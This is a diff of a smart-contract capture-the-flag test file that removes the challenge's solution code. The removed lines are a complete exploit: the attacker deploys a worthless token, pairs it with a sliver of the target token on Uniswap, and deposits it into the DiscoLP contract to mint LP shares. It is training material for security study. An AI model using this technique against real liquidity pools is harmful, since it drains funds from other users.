@@ -64,18 +64,6 @@ before(async () => {
 
 it("solves the challenge", async function () {
 
-  let exploitToken = await (await ethers.getContractFactory('Token')).connect(attacker).deploy('EXPLOIT',await attacker.getAddress(),precision.mul(100_000_000))
-
-  await exploitToken.connect(attacker).approve(uniswapRouter.address,ethers.constants.MaxUint256)
-  await jamboToken.connect(attacker).approve(uniswapRouter.address,ethers.constants.MaxUint256)
-
-  await uniswapRouter.connect(attacker).addLiquidity(exploitToken.address,jamboToken.address,precision.mul(50_000_000),precision.mul(1),1,1,await attacker.getAddress(),ethers.constants.MaxUint256)
-
-  await exploitToken.connect(attacker).approve(discoLP.address,ethers.constants.MaxUint256)
-  await discoLP.connect(attacker).depositToken(exploitToken.address,precision.mul(50_000_000),0)
-
-  console.log(await discoLP.connect(attacker).balanceOf(await attacker.getAddress()))
-
 });
 
 after(async () => {
